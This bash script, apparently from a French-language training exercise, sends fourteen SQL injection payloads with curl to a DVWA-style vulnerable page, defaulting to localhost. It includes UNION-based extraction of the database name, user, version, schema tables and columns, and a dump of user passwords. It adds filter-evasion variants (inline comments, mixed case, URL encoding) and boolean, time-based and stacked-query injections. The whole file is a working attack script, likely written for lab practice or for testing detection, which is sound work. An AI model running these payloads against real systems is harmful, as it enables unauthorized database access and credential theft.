#!/bin/bash
TARGET="${1:-localhost}"
PORT="8080"
COOKIE="PHPSESSID=cqcllo8bdvm046l3fvl96cqe7i; security=low"

echo "=== Equipe 2 - Attaques R1 (Injection SQL) ==="
echo "Cible : $TARGET:$PORT"
echo ""

# --- PAYLOADS CLASSIQUES (faciles à détecter) ---

echo "[1] OR always-true basique"
curl -s -b "$COOKIE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" \
  -o /dev/null -w "    HTTP %{http_code}\n"

echo "[2] UNION SELECT 2 colonnes"
curl -s -b "$COOKIE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+1,2--+-&Submit=Submit" \
  -o /dev/null -w "    HTTP %{http_code}\n"

echo "[3] UNION SELECT database()"
curl -s -b "$COOKIE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+1,database()--+-&Submit=Submit" \
  -o /dev/null -w "    HTTP %{http_code}\n"

echo "[4] UNION SELECT user()"
curl -s -b "$COOKIE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+user(),version()--+-&Submit=Submit" \
  -o /dev/null -w "    HTTP %{http_code}\n"

echo "[5] Dump tables information_schema"
curl -s -b "$COOKIE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+table_name,2+FROM+information_schema.tables--+-&Submit=Submit" \
  -o /dev/null -w "    HTTP %{http_code}\n"

echo "[6] Dump colonnes users"
curl -s -b "$COOKIE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+column_name,2+FROM+information_schema.columns+WHERE+table_name='users'--+-&Submit=Submit" \
  -o /dev/null -w "    HTTP %{http_code}\n"

echo "[7] Dump passwords"
curl -s -b "$COOKIE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+-&Submit=Submit" \
  -o /dev/null -w "    HTTP %{http_code}\n"

# --- PAYLOADS EVASION (plus difficiles à détecter) ---

echo "[8] Evasion commentaire inline UN/**/ION"
curl -s -b "$COOKIE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UN/**/ION+SEL/**/ECT+1,database()--+-&Submit=Submit" \
  -o /dev/null -w "    HTTP %{http_code}\n"

echo "[9] Evasion casse mixte"
curl -s -b "$COOKIE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+uNiOn+SeLeCt+user(),database()--+-&Submit=Submit" \
  -o /dev/null -w "    HTTP %{http_code}\n"

echo "[10] Evasion encodage URL"
curl -s -b "$COOKIE" \
  --data-urlencode "id=1' UNION SELECT user(),database()-- -" \
  --data-urlencode "Submit=Submit" \
  --get \
  "http://$TARGET:$PORT/vulnerabilities/sqli/" \
  -o /dev/null -w "    HTTP %{http_code}\n"

echo "[11] Boolean blind AND 1=1"
curl -s -b "$COOKIE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+AND+1=1--+-&Submit=Submit" \
  -o /dev/null -w "    HTTP %{http_code}\n"

echo "[12] Boolean blind AND 1=2"
curl -s -b "$COOKIE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+AND+1=2--+-&Submit=Submit" \
  -o /dev/null -w "    HTTP %{http_code}\n"

echo "[13] Time-based blind SLEEP(3)"
curl -s -b "$COOKIE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+AND+SLEEP(3)--+-&Submit=Submit" \
  -o /dev/null -w "    HTTP %{http_code}\n"

echo "[14] Stacked query tentative"
curl -s -b "$COOKIE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1';SELECT+SLEEP(2)--+-&Submit=Submit" \
  -o /dev/null -w "    HTTP %{http_code}\n"

echo ""
echo "=== Fin des attaques ==="
